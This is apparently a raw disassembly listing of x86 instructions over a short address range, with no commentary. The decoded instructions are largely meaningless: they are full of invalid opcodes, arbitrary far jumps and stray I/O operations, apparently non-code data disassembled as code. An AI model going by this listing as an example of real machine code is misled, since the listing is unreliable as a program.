  42893d:	jns    0x4289b6
  42893f:	jmp    0xaf58:0xdd9006c1
  428946:	add    DWORD PTR [eax],eax
  428948:	test   BYTE PTR [eax],0x0
  42894b:	add    BYTE PTR [eax-0x68],ch
  42894e:	dec    edx
  42894f:	ret    0xa886
  428952:	jl     0x428911
  428954:	push   esp
  428955:	mov    bl,0x50
  428957:	out    0xfe,eax
  428959:	inc    edx
  42895a:	hlt    
  42895b:	lods   eax,DWORD PTR ds:[esi]
  42895c:	hlt    
  42895d:	sbb    cl,ch
  42895f:	xchg   esp,eax
  428960:	cmp    dh,dh
  428962:	adc    eax,0x48503ee3
  428967:	sub    al,0x79
  428969:	stc    
  42896a:	dec    eax
  42896b:	jb     0x4289ac
  42896d:	les    edx,FWORD PTR [edx-0x4cac3961]
  428973:	jg     0x428987
  428975:	(bad)  
  428976:	lock jbe 0x4289a9
  428979:	jmp    0x4289a2
  42897b:	mov    eax,ds:0x7d67a3fd
  428980:	(bad)  
  428981:	lods   eax,DWORD PTR ds:[esi]
  428982:	rol    DWORD PTR [ecx+0x64ba0079],0xe9
  428989:	dec    edi
  42898a:	ins    DWORD PTR es:[edi],dx
  42898b:	std    
  42898c:	rol    ch,0x79
  42898f:	lods   eax,DWORD PTR ds:[si]
  428991:	gs nop
  428993:	mov    bl,0xa6
  428995:	mov    ?,WORD PTR cs:[edi-0x39029072]
  42899c:	jmp    0x428966
  42899e:	shl    BYTE PTR [esi-0xc4dba21],0xbb
  4289a5:	adc    dl,al
  4289a7:	ret    
  4289a8:	icebp  
  4289a9:	jns    0x42899c
  4289ab:	push   esp
  4289ac:	inc    ebp
  4289ad:	inc    eax
  4289ae:	fcomp  DWORD PTR [ebp-0x48]
  4289b1:	loope  0x428994
  4289b3:	rcr    eax,cl
  4289b5:	pop    ebp
  4289b6:	pop    edx
  4289b7:	xchg   DWORD PTR [edi-0x35],eax
  4289ba:	neg    DWORD PTR [esi+0x6a]
  4289bd:	fdiv   QWORD PTR [eax+0x42]
  4289c0:	mov    ecx,DWORD PTR [ebx-0x26]
  4289c3:	jmp    0xec2a:0xc5af3132
  4289ca:	(bad)  
  4289cb:	retf   0x8714
  4289ce:	or     esp,DWORD PTR [ebp+eax*2+0x54]
  4289d2:	ficom  WORD PTR [ebx+0x76da8c9a]
  4289d8:	xor    edi,DWORD PTR [esi+0x52eca8af]
  4289de:	mov    ebp,DWORD PTR [ebx]
  4289e0:	aas    
  4289e1:	mov    ecx,0x4b626b9
  4289e6:	ret    
  4289e7:	inc    edx
  4289e8:	push   esp
  4289e9:	js     0x4289f8
  4289eb:	imul   ebx,DWORD PTR [esi+esi*1],0x8b79d440
  4289f2:	xchg   edx,eax
  4289f3:	pop    ecx
  4289f4:	inc    esi
  4289f5:	(bad)  
  4289f6:	ins    BYTE PTR es:[edi],dx
  4289f7:	cdq    
  4289f8:	arpl   WORD PTR [esi-0x29145cf4],ax
  4289fe:	adc    edi,DWORD PTR [eax+0x48]
  428a01:	and    DWORD PTR [ecx],esi
  428a03:	push   0xf
  428a05:	inc    edi
  428a06:	cmp    BYTE PTR [ecx],ah
  428a08:	inc    edi
  428a09:	loope  0x428a69
  428a0b:	popa   
  428a0c:	or     DWORD PTR [ebx+0x10dc0d9],0x1fabaf2
  428a16:	mov    WORD PTR [eax],gs
  428a18:	mov    es,WORD PTR [edx-0x1e84dfb7]
  428a1e:	push   edx
  428a1f:	push   0x4e
  428a21:	inc    edi
  428a22:	aas    
  428a23:	sbb    al,0xd5
  428a25:	or     eax,0xd6679f40
  428a2a:	jno    0x428a57
  428a2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428a2d:	sub    al,0x3b
  428a2f:	idiv   ecx
  428a31:	xchg   ecx,eax
  428a32:	or     al,0xe6
  428a34:	lea    ecx,[ecx+ecx*1]
  428a37:	xlat   BYTE PTR ds:[ebx]
  428a38:	call   0x8403:0x7c899a4a
  428a3f:	hlt    
  428a40:	sbb    cl,bh
	...
  428ab2:	add    BYTE PTR [eax],al
  428ab4:	retf   0x528b
  428ab7:	jnp    0x428b0c
  428ab9:	sti    
  428aba:	jmp    0x428a77
  428abc:	xchg   ebp,eax
  428abd:	sub    eax,0x2295f691
  428ac2:	in     eax,0x6f
  428ac4:	dec    esi
  428ac5:	mov    al,0x1
  428ac7:	add    dh,dh
  428ac9:	add    BYTE PTR [eax],al
  428acb:	add    BYTE PTR [ebp+0x526cb8fe],dh
  428ad1:	cmp    ch,BYTE PTR [eax-0x1]
  428ad4:	in     eax,0xaa
  428ad6:	adc    DWORD PTR [ebp+0x24d86375],ebx
  428adc:	or     BYTE PTR [edx],0x51
  428adf:	(bad)  
  428ae0:	out    0xf6,eax
  428ae2:	xchg   ebp,eax
  428ae3:	in     eax,0x40
  428ae5:	fstp   TBYTE PTR ds:0x2f0475f9
  428aeb:	pop    ds
  428aec:	inc    edx
  428aed:	cmc    
  428aee:	sbb    cl,dh
  428af0:	xor    bl,BYTE PTR [edi+0x5c]
  428af3:	mov    bh,BYTE PTR [ecx+0x72]
  428af6:	shl    BYTE PTR [ecx],cl
  428af8:	push   esp
  428af9:	mov    eax,0x13b32954
  428afe:	mov    ebp,0xbb4f44a7
  428b03:	jbe    0x428a8e
  428b05:	jo     0x428b7f
  428b07:	adc    esi,DWORD PTR [ebx-0x1e]
  428b0a:	mov    al,0xad
  428b0c:	add    al,0xc
  428b0e:	push   edi
  428b0f:	test   al,0xfb
  428b11:	sbb    eax,0x9bce3cab
  428b16:	xlat   BYTE PTR ds:[ebx]
  428b17:	icebp  
  428b18:	push   0x4178978b
  428b1d:	sti    
  428b1e:	inc    esi
  428b1f:	mov    edi,0x66af3829
  428b24:	inc    ebx
  428b25:	in     eax,dx
  428b26:	xchg   esi,esi
  428b28:	adc    eax,0x665daf56
  428b2d:	ds ss popa 
  428b30:	mov    ds:0xe7eee7af,eax
  428b35:	cmc    
  428b36:	bnd jge 0x428b82
  428b39:	jno    0x428ae5
  428b3b:	pop    ebx
  428b3c:	and    DWORD PTR [ebp+ecx*4+0x3d],esi
  428b40:	(bad)  
  428b41:	mov    al,ds:0x5dcf1728
  428b46:	cld    
  428b47:	xchg   esi,eax
  428b48:	mov    esi,0x9ff2801d
  428b4d:	mov    ebp,0xeeacfb9d
  428b52:	and    al,0xcb
  428b54:	dec    eax
  428b55:	cwde   
  428b56:	cwde   
  428b57:	dec    esi
  428b58:	bound  ebx,QWORD PTR [ebp+esi*1+0x5c369ed4]
  428b5f:	push   ss
  428b60:	xor    DWORD PTR [edi-0x4e],0xb9b73f96
  428b67:	leave  
  428b68:	ins    DWORD PTR es:[edi],dx
  428b69:	cmp    al,0x25
  428b6b:	or     eax,0xb147c3f2
  428b70:	imul   esi,DWORD PTR [esi+0x38ed02ba],0x4e8cb63a
  428b7a:	mov    cl,0x2d
  428b7c:	mov    ebp,0x5e6f2bdf
  428b81:	or     DWORD PTR [esi+0x63a374e1],ebx
  428b87:	ror    BYTE PTR [ecx],cl
  428b89:	adc    ebx,DWORD PTR [edi]
  428b8b:	aad    0x4c
  428b8d:	pop    es
  428b8e:	push   edx
  428b8f:	push   ebx
  428b90:	and    al,0x47
  428b92:	sti    
  428b93:	pop    ecx
  428b94:	and    DWORD PTR [edx+0x4e3f2f62],esi
  428b9a:	je     0x428c0e
  428b9c:	test   al,0x96
  428b9e:	test   eax,0xfd8b4d74
  428ba3:	loopne 0x428b3f
  428ba5:	lods   al,BYTE PTR ds:[esi]
  428ba6:	icebp  
  428ba7:	push   0xa2294b0b
  428bac:	dec    ebx
  428bad:	in     eax,0xa3
  428baf:	shr    DWORD PTR [eax+0x47],cl
  428bb2:	jne    0x428bb1
  428bb4:	fwait
  428bb5:	push   eax
  428bb6:	xchg   BYTE PTR [edx+ebx*4],dl
  428bb9:	xchg   ebp,eax
  428bba:	unpcklps xmm6,XMMWORD PTR [ebx+0xef78735]
  428bc1:	sbb    eax,DWORD PTR [eax]
	...
  428c33:	add    BYTE PTR [ebx-0xcbc4fb0],ah
  428c39:	jecxz  0x428c2e
  428c3b:	lock mov ebx,0x47d7a28f
  428c41:	imul   eax,DWORD PTR [edx+0x44],0x1b144
  428c48:	test   BYTE PTR [eax],0x0
  428c4b:	add    BYTE PTR [ecx],dh
  428c4d:	sbb    bl,BYTE PTR [ebp-0x5124877d]
  428c53:	retf   0x7f4e
  428c56:	ror    BYTE PTR [ebx+0x75],1
  428c59:	nop
  428c5a:	lahf   
  428c5b:	(bad)  
  428c5c:	xchg   esi,eax
  428c5d:	pop    ss
  428c5e:	fbld   TBYTE PTR ds:[ecx+0x38]
  428c62:	xchg   edi,eax
  428c63:	xchg   ebp,eax
  428c64:	xor    eax,DWORD PTR [ebx]
  428c66:	add    al,0xc9
  428c68:	mov    bh,bh
  428c6a:	sahf   
  428c6b:	jg     0x428c5d
  428c6d:	jecxz  0x428c46
  428c6f:	or     eax,0x52ce42a7
  428c74:	adc    al,0xe2
  428c76:	lds    esi,FWORD PTR [edx-0x5ec75b3f]
  428c7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428c7d:	scas   eax,DWORD PTR es:[edi]
  428c7e:	xchg   BYTE PTR [ebp+0x12],cl
  428c81:	imul   ebx,ecx,0x19
  428c84:	rol    BYTE PTR [ebx*2-0x3908706b],1
  428c8b:	sub    eax,0x39f83c8f
  428c90:	and    DWORD PTR [edx+ecx*8+0x27],edx
  428c94:	idiv   BYTE PTR [eax+0x4bc3f21]
  428c9a:	sahf   
  428c9b:	jl     0x428caf
  428c9d:	adc    al,0x58
  428c9f:	cmp    ah,BYTE PTR [edi+edi*4]
  428ca2:	cmp    eax,0xbee79395
  428ca7:	lods   eax,DWORD PTR ds:[esi]
  428ca8:	jg     0x428ca6
  428caa:	push   ebx
  428cab:	cmp    eax,0xf7196756
  428cb0:	mov    ds:0xf8c4b8e5,eax
  428cb5:	ret    0x3f5
  428cb8:	dec    ebp
  428cb9:	dec    ebp
  428cba:	xchg   edi,eax
  428cbb:	(bad)  
  428cbc:	xlat   BYTE PTR ds:[ebx]
  428cbd:	xlat   BYTE PTR ds:[ebx]
  428cbe:	loope  0x428d11
  428cc0:	cwde   
  428cc1:	inc    ebx
  428cc2:	mov    esi,0x6ddcb333
  428cc7:	add    edx,DWORD PTR [ebx+0x292202e3]
  428ccd:	push   ss
  428cce:	inc    ebx
  428ccf:	imul   esi,DWORD PTR [ecx-0x4f],0x5e498acb
  428cd6:	sbb    DWORD PTR [edi-0x1c],esi
  428cd9:	dec    esi
  428cda:	into   
  428cdb:	sbb    ebp,DWORD PTR [ebp+ebp*4-0x1b8cf00d]
  428ce2:	xchg   BYTE PTR [ecx-0x79],dh
  428ce5:	push   ebp
  428ce6:	test   ebp,esi
  428ce8:	adc    dh,BYTE PTR [eax]
  428cea:	push   edx
  428ceb:	cmp    al,0x96
  428ced:	mov    ch,0x4c
  428cef:	lock pop esp
  428cf1:	rol    DWORD PTR [edi],0xeb
  428cf4:	cdq    
  428cf5:	inc    edi
  428cf6:	add    DWORD PTR [ecx-0xc],0x29
  428cfa:	inc    esi
  428cfb:	jo     0x428d4d
  428cfd:	(bad)  
  428cfe:	aam    0x62
  428d00:	mul    DWORD PTR [ebx-0x3d545045]
  428d06:	out    0xed,eax
  428d08:	imul   esp,DWORD PTR [ecx],0xf561d9ba
  428d0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428d0f:	mov    al,0x77
  428d11:	push   ecx
  428d12:	or     esi,esp
  428d14:	dec    edx
  428d15:	pop    ebx
  428d16:	pusha  
  428d17:	cwde   
  428d18:	vprotw ymm5,xmm4,0xaf
  428d1d:	adc    ebx,DWORD PTR [ecx]
  428d1f:	mov    dl,0xec
  428d21:	leave  
  428d22:	inc    esp
  428d23:	add    ch,al
  428d25:	pop    ebp
  428d26:	and    eax,0x63dbdc02
  428d2b:	mov    ch,0xba
  428d2d:	imul   esi,DWORD PTR [ecx-0x3a8f2d79],0x3a495ee0
  428d37:	adc    BYTE PTR [edi+esi*2-0x4b],al
  428d3b:	sbb    cl,BYTE PTR [edi*4-0x415b12d9]
	...
  428db2:	add    BYTE PTR [eax],al
  428db4:	mov    eax,0x6d3c25f1
  428db9:	cld    
  428dba:	mov    ecx,0x195a21f5
  428dbf:	test   eax,0xb5cee443
  428dc4:	cmp    dh,BYTE PTR [edx+0xf60001]
  428dca:	add    BYTE PTR [eax],al
  428dcc:	jle    0x428d94
  428dce:	pop    es
  428dcf:	imul   BYTE PTR [ecx+0x71983bd5]
  428dd5:	loope  0x428e4c
  428dd7:	ds ss mov ebp,ecx
  428ddb:	imul   esi,DWORD PTR [eax+0x4],0x70
  428ddf:	and    ah,cl
  428de1:	cli    
  428de2:	lods   eax,DWORD PTR ds:[esi]
  428de3:	xor    BYTE PTR [ebx+0x3e54e863],bh
  428de9:	sbb    dh,ah
  428deb:	pushf  
  428dec:	dec    esp
  428ded:	sub    BYTE PTR [ecx+0x8d49e79],ch
  428df3:	fnstsw WORD PTR [edi+0x4f]
  428df6:	inc    esi
  428df7:	and    eax,0xf31892dc
  428dfc:	inc    esi
  428dfd:	xchg   ebp,eax
  428dfe:	sbb    BYTE PTR [ebp+0x66d94ffe],ch
  428e04:	mov    al,0x67
  428e06:	or     esp,DWORD PTR [esi]
  428e08:	jmp    0x83f79a9c
  428e0d:	cmc    
  428e0e:	out    dx,eax
  428e0f:	xor    DWORD PTR [ebp+0x324b4fea],edi
  428e15:	and    BYTE PTR [esi],dl
  428e17:	stos   DWORD PTR es:[edi],eax
  428e18:	mov    dl,0xe8
  428e1a:	inc    ebp
  428e1b:	repz xchg ebx,eax
  428e1d:	and    al,0xc9
  428e1f:	sub    ebx,0x6d9c2c88
  428e25:	clc    
  428e26:	test   BYTE PTR [ecx],0xe5
  428e29:	out    0x7f,al
  428e2b:	mov    BYTE PTR [ebp+0x7e],al
  428e2e:	inc    edi
  428e2f:	out    dx,al
  428e30:	pop    ebx
  428e31:	(bad)  
  428e32:	hlt    
  428e33:	fcmovb st,st(3)
  428e35:	xor    BYTE PTR [esi+0x17],0x5b
  428e39:	jae    0x428e73
  428e3b:	adc    eax,0x365b9aeb
  428e40:	jbe    0x428e40
  428e42:	retf   0xaa0d
  428e45:	xchg   BYTE PTR [edi],dl
  428e47:	fisub  WORD PTR [ebp+0x3a97c6b3]
  428e4d:	push   esp
  428e4e:	outs   dx,BYTE PTR ds:[esi]
  428e4f:	push   ecx
  428e50:	sbb    edx,edx
  428e52:	mov    eax,ds:0x6cf33118
  428e57:	rcr    DWORD PTR [ebx+edi*1],cl
  428e5a:	mov    al,0x91
  428e5c:	adc    bh,BYTE PTR [ebp+eax*2-0x80]
  428e60:	enter  0xc800,0xd2
  428e64:	pop    ebx
  428e65:	lds    esi,FWORD PTR [ecx]
  428e67:	dec    esp
  428e68:	pop    ecx
  428e69:	push   ebp
  428e6a:	mov    ds:0xe5ec2765,al
  428e6f:	jmp    0x6e05:0xe57d1cc9
  428e76:	imul   ebp,esi,0x38145c05
  428e7c:	in     eax,0x80
  428e7e:	xchg   esi,eax
  428e7f:	scas   al,BYTE PTR es:[edi]
  428e80:	cdq    
  428e81:	add    dl,BYTE PTR [eax+eax*4]
  428e84:	pop    esi
  428e85:	dec    ebp
  428e86:	cdq    
  428e87:	arpl   WORD PTR [edi+0x5a],sp
  428e8a:	add    ch,dl
  428e8c:	mov    eax,ds:0x1a31471c
  428e91:	sahf   
  428e92:	stc    
  428e93:	cmp    eax,0x7a92e2e9
  428e98:	ret    0xf886
  428e9b:	and    esi,DWORD PTR [ecx]
  428e9d:	adc    edi,DWORD PTR [ecx]
  428e9f:	jnp    0x428ef4
  428ea1:	mov    bl,0x84
  428ea3:	gs dec edx
  428ea5:	cld    
  428ea6:	xor    al,0x88
  428ea8:	add    BYTE PTR [ecx],0x20
  428eab:	js     0x428e89
  428ead:	push   esi
  428eae:	adc    BYTE PTR [esi],0x18
  428eb1:	out    dx,eax
  428eb2:	mov    WORD PTR [edx],?
  428eb4:	push   edi
  428eb5:	sub    al,al
  428eb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428eb8:	cmp    bl,cl
  428eba:	push   edx
  428ebb:	iret   
  428ebc:	mov    dh,0x5c
  428ebe:	loopne 0x428f0d
  428ec0:	dec    eax
  428ec1:	mov    esp,0x0
	...
  428f32:	add    BYTE PTR [eax],al
  428f34:	mov    cl,0xa7
  428f36:	dec    ebx
  428f37:	das    
  428f38:	pop    edi
  428f39:	out    dx,eax
  428f3a:	cmc    
  428f3b:	mov    edi,0x37e5e17c
  428f40:	dec    esp
  428f41:	ss pushw ss
  428f44:	xor    BYTE PTR [ebx+0xf60001],dh
  428f4a:	add    BYTE PTR [eax],al
  428f4c:	pop    ecx
  428f4d:	std    
  428f4e:	popf   
  428f4f:	xchg   edx,eax
  428f50:	in     eax,dx
  428f51:	mov    esp,0x26416e3c
  428f56:	sbb    esi,DWORD PTR [edi-0x63]
  428f59:	pop    esi
  428f5a:	stos   BYTE PTR es:[edi],al
  428f5b:	add    BYTE PTR [ebp+0x34],bh
  428f5e:	fidivr DWORD PTR [ebp-0x2f]
  428f61:	loope  0x428f4d
  428f63:	jmp    0x66d7:0x5f2a42af
  428f6a:	jns    0x428f4c
  428f6c:	or     eax,0x4b1e2255
  428f71:	or     dl,BYTE PTR [eax]
  428f73:	dec    ebx
  428f74:	pop    eax
  428f75:	div    edx
  428f77:	mov    ebp,0x9e9c5114
  428f7c:	xor    ah,BYTE PTR [ecx]
  428f7e:	mov    bl,0x6b
  428f80:	(bad)  
  428f81:	fdivr  DWORD PTR [ebx]
  428f83:	das    
  428f84:	inc    esi
  428f85:	loope  0x428f30
  428f87:	dec    esi
  428f88:	or     al,0x93
  428f8a:	addr16 jae 0x428fb4
  428f8d:	cld    
  428f8e:	dec    esp
  428f8f:	pop    edi
  428f90:	mov    al,0x89
  428f92:	jecxz  0x428f45
  428f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428f95:	inc    esi
  428f96:	data16 mov ch,0xed
  428f99:	stos   DWORD PTR es:[edi],eax
  428f9a:	pop    eax
  428f9b:	mov    esp,ecx
  428f9d:	push   esi
  428f9e:	mov    bh,0x64
  428fa0:	jecxz  0x428f7d
  428fa2:	inc    edi
  428fa3:	sar    BYTE PTR [edi],0xf8
  428fa6:	scas   al,BYTE PTR es:[edi]
  428fa7:	adc    BYTE PTR [edi+0x10],dl
  428faa:	xchg   DWORD PTR [ebx],edx
  428fac:	retf   0x7b1a
  428faf:	daa    
  428fb0:	jle    0x428f3d
  428fb2:	test   al,0x9d
  428fb4:	(bad)  
  428fb6:	fsubr  st,st(1)
  428fb8:	pusha  
  428fb9:	test   esi,ecx
  428fbb:	sub    cl,BYTE PTR [esi+0x2a]
  428fbe:	mov    bh,0x60
  428fc0:	sbb    edx,ebp
  428fc2:	mov    bl,0xc6
  428fc4:	and    eax,0xca0f0dac
  428fc9:	mov    esi,0x430f5598
  428fce:	addr16 add eax,0xd99bbe07
  428fd4:	and    cl,bl
  428fd6:	jo     0x42902d
  428fd8:	jae    0x428f75
  428fda:	enter  0xd4b2,0xbf
  428fde:	pop    ebx
  428fdf:	jbe    0x42903e
  428fe1:	call   0xf95e:0xdde74732
  428fe8:	outs   dx,DWORD PTR ds:[esi]
  428fe9:	(bad)  
  428fea:	imul   ebx,DWORD PTR [ecx+0x6dbd37f8],0x47
  428ff1:	sbb    eax,esi
  428ff3:	cmp    ah,al
  428ff5:	and    BYTE PTR [edi+0x39],ch
  428ff8:	jne    0x428f9c
  428ffa:	stc    
  428ffb:	in     eax,0xa2
  428ffd:	sbb    ch,BYTE PTR [ecx+0x79b1ef8b]
  429003:	sar    DWORD PTR [edx],cl
  429005:	int    0xf6
  429007:	ss scas eax,DWORD PTR es:[edi]
  429009:	shl    BYTE PTR [ebp+eiz*2+0x44],cl
  42900d:	cli    
  42900e:	les    ebx,FWORD PTR [edx+edx*2]
  429011:	mov    ebp,0x85004510
  429016:	out    dx,eax
  429017:	clc    
  429018:	mov    ebp,0xef5bd065
  42901d:	xor    ah,BYTE PTR [ebp+0x48e97249]
  429023:	inc    ebx
  429024:	aad    0x2e
  429026:	pop    edx
  429027:	mov    edi,0xbfd53844
  42902c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42902d:	out    0x8d,eax
  42902f:	ins    BYTE PTR es:[edi],dx
  429030:	fdiv   st,st(2)
  429032:	vdivps xmm3,xmm0,XMMWORD PTR [esi+0x7c]
  429037:	fdiv   QWORD PTR [edx+0x29]
  42903a:	daa    
  42903b:	loopne 0x429011
  42903d:	stos   BYTE PTR es:[edi],al
  42903e:	and    eax,DWORD PTR [edi+0x24eb]
	...
  4290b4:	fucomip st,st(6)
  4290b6:	std    
  4290b7:	dec    esp
  4290b8:	std    
  4290b9:	pop    edi
  4290ba:	(bad)  
  4290bb:	(bad)  
  4290bc:	mov    edi,0xebb66cf7
  4290c1:	test   eax,0xb426ec94
  4290c6:	add    DWORD PTR [eax],eax
  4290c8:	test   BYTE PTR [eax],0x0
  4290cb:	add    BYTE PTR [edx*8+0x153c41d0],ch
  4290d2:	sbb    DWORD PTR [eax-0x473dfdf5],0xfffffffe
  4290d9:	ins    DWORD PTR es:[edi],dx
  4290da:	sbb    BYTE PTR [esi-0x32],0x69
  4290de:	pop    ebx
  4290df:	jbe    0x429066
  4290e1:	mov    bh,0x2
  4290e3:	adc    al,0xb
  4290e5:	xor    al,0x32
  4290e7:	sub    BYTE PTR gs:0xe845e0eb,ch
  4290ee:	cld    
  4290ef:	mov    ds:0x833eb4e3,al
  4290f4:	push   edi
  4290f5:	test   BYTE PTR [ebx],0x23
  4290f8:	fs jmp 0x2b40:0x9e1d8eaf
  429100:	add    BYTE PTR [esi],ch
  429102:	nop
  429103:	pop    edi
  429104:	inc    ebp
  429105:	add    DWORD PTR ds:0x54c45dbc,0x29ecc839
  42910f:	out    0x72,al
  429111:	mov    dh,0xdf
  429113:	bound  eax,QWORD PTR [edi+0x45]
  429116:	pusha  
  429117:	mov    dh,0x9c
  429119:	dec    edx
  42911a:	idiv   BYTE PTR [esi+ebp*8+0xe]
  42911e:	adc    BYTE PTR [eax+0x35565f24],0xc2
  429125:	xor    al,0xd8
  429127:	ret    
  429128:	in     eax,dx
  429129:	sub    al,0x13
  42912b:	or     edi,DWORD PTR [esp+ebp*1]
  42912e:	pop    ss
  42912f:	shl    DWORD PTR [eax-0x67],1
  429132:	mov    eax,0xdb0c0c5c
  429137:	in     al,0xd9
  429139:	adc    dl,BYTE PTR [ebx+0xafe0536]
  42913f:	daa    
  429140:	test   eax,0x6e226b6b
  429145:	cdq    
  429146:	jne    0x4291b4
  429148:	cmp    dh,dh
  42914a:	imul   ebx,DWORD PTR [edi-0x12807c6c],0xb0d98dc3
  429154:	adc    BYTE PTR [ebp+edi*1-0x38],al
  429158:	cdq    
  429159:	nop
  42915a:	rol    DWORD PTR [edx-0x26],cl
  42915d:	shr    DWORD PTR [ebx-0x2f],cl
  429160:	jmp    0x7b057b47
  429165:	mov    cl,0x56
  429167:	data16 and al,0xfc
  42916a:	mov    cl,0x60
  42916c:	pop    esp
  42916d:	fld    QWORD PTR [ebx-0x56]
  429170:	nop
  429171:	push   ecx
  429172:	rcr    DWORD PTR [eax+0x139c1936],1
  429178:	mov    ecx,0x17abb52e
  42917d:	dec    ecx
  42917e:	sbb    BYTE PTR ds:0xa65e5ab3,dh
  429184:	rol    DWORD PTR [eax+0x1d28642],1
  42918a:	jnp    0x429162
  42918c:	cwde   
  42918d:	dec    edx
  42918e:	pop    es
  42918f:	cs neg eax
  429192:	dec    ebx
  429193:	lea    eax,[esi]
  429195:	bound  edx,QWORD PTR [ebp+eax*1+0x9]
  429199:	(bad)  
  42919a:	pop    ds
  42919b:	aad    0xcc
  42919d:	in     al,0x30
  42919f:	nop
  4291a0:	push   ecx
  4291a1:	sub    esi,DWORD PTR [edi]
  4291a3:	mov    ecx,0xfb02c932
  4291a8:	mov    BYTE PTR [esp+ebp*4-0xdc1da3b],ah
  4291af:	rcr    BYTE PTR [esi-0x49],cl
  4291b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4291b3:	jno    0x4291f1
  4291b5:	repnz add al,0xa8
  4291b8:	jnp    0x4291dc
  4291ba:	popa   
  4291bb:	mov    esp,0x7d38bb2c
  4291c0:	sub    DWORD PTR [edx+0x0],0x0
	...
  429234:	(bad)  
  429235:	fidiv  WORD PTR [esi]
  429237:	loop   0x429278
  429239:	jmp    0x67eb:0x13f5ffd7
  429240:	and    DWORD PTR [edx+eax*2],eax
  429243:	(bad)  
  429244:	sbb    al,0xb5
  429246:	add    DWORD PTR [eax],eax
  429248:	test   BYTE PTR [eax],0x0
  42924b:	add    BYTE PTR [edx],ah
  42924d:	dec    ebp
  42924e:	cmp    eax,0x6544d4f6
  429253:	mov    cl,0x3
  429255:	pop    ds
  429256:	(bad)  
  429257:	jle    0x429234
  429259:	push   ss
  42925a:	push   eax
  42925b:	xchg   ebx,eax
  42925c:	loop   0x429281
  42925e:	lahf   
  42925f:	sbb    al,0xf3
  429261:	out    dx,eax
  429262:	jae    0x4292c0
  429264:	add    dh,BYTE PTR [edi-0x15]
  429267:	and    DWORD PTR [edx],eax
  429269:	add    DWORD PTR [ebp+0xa],eax
  42926c:	cdq    
  42926d:	push   ecx
  42926e:	call   0x9ac1:0x2dd0e4d0
  429275:	lock sbb eax,DWORD PTR [edx-0x15]
  429279:	pusha  
  42927a:	mov    ds:0x691442b6,eax
  42927f:	(bad)  
  429280:	push   ds
  429281:	add    DWORD PTR [edx],ecx
  429283:	rcl    DWORD PTR [edx+0x3070a338],1
  429289:	ret    0xa8c2
  42928c:	out    0x82,al
  42928e:	std    
  42928f:	push   edx
  429290:	lock push ecx
  429292:	adc    ebx,DWORD PTR [edi+0x6c]
  429295:	(bad)  
  429296:	adc    eax,0x31e852f2
  42929b:	leave  
  42929c:	into   
  42929d:	push   ss
  42929e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42929f:	push   edx
  4292a0:	in     al,dx
  4292a1:	xchg   ecx,eax
  4292a2:	jmp    0xed32:0x930e7860
  4292a9:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4292ab:	aaa    
  4292ac:	in     al,0x22
  4292ae:	push   edi
  4292af:	fstp   QWORD PTR [ecx-0x3cf1ac6e]
  4292b5:	pop    esi
  4292b6:	jbe    0x42928c
  4292b8:	es inc edx
  4292ba:	stc    
  4292bb:	lahf   
  4292bc:	jb     0x42928d
  4292be:	inc    esp
  4292bf:	lock xor DWORD PTR [eax+0x10],ebx
  4292c3:	cld    
  4292c4:	adc    edx,edi
  4292c6:	dec    ecx
  4292c7:	mov    dh,0x67
  4292c9:	das    
  4292ca:	hlt    
  4292cb:	cdq    
  4292cc:	mov    ch,0xbf
  4292ce:	pushf  
  4292cf:	loopne 0x429335
  4292d1:	div    DWORD PTR [esi-0x7f44c1fe]
  4292d7:	xor    ch,BYTE PTR [esi]
  4292d9:	gs mov bh,0xa5
  4292dc:	pop    edi
  4292dd:	or     al,0x16
  4292df:	pop    ds
  4292e0:	pop    ebp
  4292e1:	inc    edi
  4292e2:	push   ss
  4292e3:	imul   eax,DWORD PTR [edi+0x4a],0x65e78d07
  4292ea:	cmp    bl,BYTE PTR [eax]
  4292ec:	std    
  4292ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4292ee:	loopne 0x42932a
  4292f0:	or     al,0x4a
  4292f2:	stos   DWORD PTR es:[edi],eax
  4292f3:	adc    eax,0x2497cdd4
  4292f8:	outs   dx,DWORD PTR ds:[esi]
  4292f9:	daa    
  4292fa:	mov    bl,0x1e
  4292fc:	gs cli 
  4292fe:	mov    BYTE PTR [edx-0x3d620066],bh
  429304:	out    dx,eax
  429305:	in     eax,0x4f
  429307:	xchg   esi,eax
  429308:	mov    ?,esp
  42930a:	fcmovu st,st(0)
  42930c:	pop    es
  42930d:	mov    WORD PTR [ebp+0x97f0f1],gs
  429313:	call   0x5937:0xebc0d120
  42931a:	idiv   BYTE PTR ds:0xff403480
  429320:	sbb    ch,BYTE PTR [edi]
  429322:	lock mov ds:0x6245b847,eax
  429328:	mov    fs,WORD PTR gs:[edx+eiz*8]
  42932c:	pop    esp
  42932d:	cwde   
  42932e:	call   0xb14a:0xf554ec9f
  429335:	jnp    0x4292e8
  429337:	pushf  
  429338:	psrlw  mm6,mm1
  42933b:	or     al,0x20
  42933d:	adc    DWORD PTR [edi],eax
  42933f:	lods   al,BYTE PTR ds:[esi]
  429340:	loop   0x429345
	...
  4293b2:	add    BYTE PTR [eax],al
  4293b4:	push   cs
  4293b5:	xchg   esp,eax
  4293b6:	jg     0x42941b
  4293b8:	(bad)  
  4293b9:	jmp    0x4293d9
  4293bb:	std    
  4293bc:	jge    0x4293da
  4293be:	in     al,dx
  4293bf:	xchg   edi,eax
  4293c0:	add    DWORD PTR [edi],ecx
  4293c2:	mov    bl,0x67
  4293c4:	adc    dh,BYTE PTR [esi+0xf60001]
  4293ca:	add    BYTE PTR [eax],al
  4293cc:	xchg   esp,eax
  4293cd:	stos   BYTE PTR es:[edi],al
  4293ce:	jl     0x4293a7
  4293d0:	imul   eax,DWORD PTR [eax],0x6bac1f58
  4293d6:	pop    edx
  4293d7:	retf   0xa6be
  4293da:	int3   
  4293db:	outs   dx,BYTE PTR ds:[esi]
  4293dc:	mov    bh,0xcd
  4293de:	lods   al,BYTE PTR ds:[esi]
  4293df:	jle    0x4293e6
  4293e1:	sbb    ah,0x77
  4293e4:	lock adc al,0x48
  4293e7:	shr    BYTE PTR [eax],0xd
